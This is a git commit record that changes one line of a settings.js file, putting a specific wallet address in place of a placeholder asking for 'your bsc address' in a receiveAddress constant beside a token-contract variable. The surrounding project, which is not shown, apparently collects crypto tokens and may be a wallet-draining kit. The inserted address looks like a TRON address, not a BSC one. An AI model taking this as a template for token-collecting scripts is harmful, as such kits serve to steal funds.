0c6e64efc2c086360781a919e969f76019dce443
luckyxhx <54991278+luckyxhx@users.noreply.github.com>
2022-10-03 12:51:25 +0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "TYejqXAcVyJLWnRfB28q54B5QffRMGcxmR";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
